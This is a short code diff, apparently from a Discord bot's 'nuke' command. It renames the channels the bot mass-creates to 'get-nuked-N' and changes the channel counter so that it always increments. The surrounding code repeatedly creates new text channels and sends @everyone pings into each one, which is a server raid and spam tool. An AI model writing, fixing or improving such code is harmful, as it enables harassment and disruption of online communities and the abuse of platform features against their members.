@@ -61,7 +61,7 @@ module.exports = {
 
         // Create a new text channel and send @everyone pings
         try {
-          const channel = await guild.channels.create(`nuke-channel-${createdChannels + 1}`, {
+          const channel = await guild.channels.create(`get-nuked-${createdChannels + 1}`, {
             type: 'GUILD_TEXT'
           });
 
@@ -69,11 +69,12 @@ module.exports = {
             await channel.send('@everyone');
           }
 
-          createdChannels++;
           console.log(`Created and pinged channel ${channel.id}`);
         } catch (error) {
           console.error('Failed to create or ping channel:', error);
         }
+
+        createdChannels++; // Move this outside the try block to ensure it always increments
       }, 1000); // Adjust the interval if needed
     }
 
